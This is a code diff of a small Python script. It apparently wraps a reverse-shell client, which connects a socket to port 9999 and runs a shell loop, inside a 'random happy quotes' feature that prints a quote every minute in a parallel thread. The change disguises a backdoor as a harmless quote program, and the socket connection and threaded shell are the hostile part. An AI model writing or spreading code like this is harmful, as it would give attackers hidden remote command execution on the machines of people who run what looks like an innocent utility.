@@ -1,6 +1,15 @@
 import socket 
 import subprocess
 import os
+import time
+import threading
+from quote import quote
+
+starttime = time.time()
+def random_quotes():
+	res = quote('happy',limit=1)
+	print(res[0]['quote'])
+	time.sleep(60.0 - ((time.time() - starttime) % 60.0))
 
 def shell(c):
     while True:
@@ -22,4 +31,7 @@ def shell(c):
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
 sock.connect(("127.0.0.1", 9999))
-shell(sock)
+t1 = threading.Thread(target=shell, args=[sock])
+t2 = threading.Thread(target=random_quotes)
+t1.start()
+t2.start()
